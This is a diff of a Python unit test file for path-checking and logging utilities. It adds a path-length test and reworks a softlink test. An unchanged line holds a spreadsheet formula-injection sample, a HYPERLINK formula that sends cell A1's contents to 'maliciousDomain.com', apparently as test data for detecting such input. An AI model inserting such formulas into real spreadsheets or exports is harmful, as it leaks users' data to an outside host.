@@ -94,7 +94,6 @@ class TestUtilsMethods(unittest.TestCase):
  '=HYPERLINK("https://maliciousDomain.com/evil.html?data="&A1,"Click to view additional information")'
         ]
 
-
     def test_print_info_log(self):
         log.print_info_log('test info log')
 
@@ -413,6 +412,11 @@ class TestUtilsMethods(unittest.TestCase):
     def test_check_path_valid2(self):
         ret = path_check.check_path_valid('/home/7%##3', True)
         self.assertEqual(ret, CompareError.MSACCUCMP_INVALID_PARAM_ERROR)
+
+    def test_check_path_valid_when_path_too_long(self):
+        with mock.patch('os.path.realpath', return_value='a' * ConstManager.LINUX_PATH_MAX_LEN):
+            ret = path_check.check_path_valid('/home/result.txt', True)
+        self.assertEqual(ret, CompareError.MSACCUCMP_INVALID_PATH_ERROR)
 
     def test_check_path_valid3(self):
         with mock.patch('os.path.exists', return_value=False):
@@ -789,10 +793,11 @@ class TestUtilsMethods(unittest.TestCase):
         self.assertEqual(ret, op_name)
 
     def test_check_output_path_valid_softlink_path_raises_error(self):
-        with mock.patch("os.path.islink", return_value=True):
-            ret = path_check.check_output_path_valid('/home/output_path', exist=True)
-        # 验证异常类型和错误码
-        assert ret == CompareError.MSACCUCMP_INVALID_PATH_ERROR
+        with pytest.raises(CompareError) as error:
+            with mock.patch("cmp_utils.path_check.os.path.islink", return_value=True):
+                path_check.check_output_path_valid('/home/output_path', exist=True)
+        assert error.value.args[0] == CompareError.MSACCUCMP_INVALID_PATH_ERROR
+
 
 if __name__ == '__main__':
     unittest.main()
